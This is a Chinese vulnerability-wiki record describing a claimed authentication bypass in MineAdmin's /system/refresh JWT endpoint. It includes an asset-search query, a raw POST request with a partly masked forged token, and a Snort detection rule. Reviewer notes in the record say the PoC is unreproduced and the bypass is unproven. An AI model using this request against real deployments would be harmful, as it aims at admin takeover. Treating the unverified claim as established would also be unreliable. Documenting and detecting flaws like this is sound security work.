---
source: "SourByte05/Vulnerability-Wiki-PoC"
product: "MineAdmin/JWT刷新"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "MineAdmin企业级后台管理系统逻辑缺陷漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：笼统v1.x/v2.x，未锁定提交；/system/refresh接受何种令牌未交代"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-8843ba540dcecc4463ac1f41"
entity_id: "ve-8843ba540dcecc4463ac1f41"
schema_version: "1"
---

## 核对与使用边界

- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：笼统v1.x/v2.x，未锁定提交；/system/refresh接受何种令牌未交代

代码与实验材料：给出一个完整JWT和请求，缺伪造步骤、响应及有效管理员验证，无法证明签名绕过

来源证据范围：SourByte05及产品文档，缺漏洞一手修复来源

- **凭据与会话边界（1）**：核心认证绕过结论证据不完整；依据：仅提交Bearer令牌，没有对比未知密钥下篡改签名/claims的结果；把签名与admin身份混述。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（2）**：检测规则可大量误报；依据：Snort规则只匹配正常refresh POST、Authorization和固定JSON类型；不能判断签名验证失效。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **凭据与会话边界（3）**：应移除可复用认证材料与不完整验证描述；依据：正文硬编码完整令牌；后续返回新令牌及身份确认只有叙述。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# MineAdmin企业级后台管理系统逻辑缺陷漏洞

MineAdmin官网：https://doc.mineadmin.com/

资产测绘语法：body="MineAdmin"

# 影响版本

MineAdmin v1.x
MineAdmin v2.x

# **漏洞描述** 

MineAdmin后台管理系统基于 Hyperf 框架开发。是一个后台权限管理系统，提供完善的权限体系，让开发者把注意力集中到具体业务当中，降低开发成本，提高项目效率。/system/refresh处存在逻辑缺陷漏洞，”refresh”方法用于刷新 Token，攻击者可以未授权构造一个签名为超级管理员的 JWT，直接骗过系统，获取一个合法的、拥有管理员权限的新 Token。此系统前后端分离前端访问端口默认：8180 后端 默认API端口：9501 。该漏洞复现利用后端端口，实际环境可能会变，请自行判断。

# 漏洞复现

POC/EXP：构造的jwt（次处可任意构造生效及过期时间）




```
POST /system/refresh HTTP/1.1
Host: 127.0.0.1:9501
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ*******************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************XdI
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh_CN
```




POC/EXP：复制响应包的token，并发起请求查看info信息（也可查看其他信息此处不一一展示）




sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"MineAdmin - Logic Flaw Vulnerability via /system/refresh";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/system/refresh";
    http.header; content:"Authorization: Bearer";
    http.header; content:"Content-Type: application/json;charset=UTF-8";
    metadata:
        service http,
        affected_product "MineAdmin企业级后台管理系统",
        vulnerability_type "Logic Flaw Vulnerability",
        severity "medium";
    classtype:policy-violation;
    sid:1000579;
    rev:1;
    priority:2;
)
```


# 漏洞修复

在 refresh方法上强制校验 JWT 签名。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
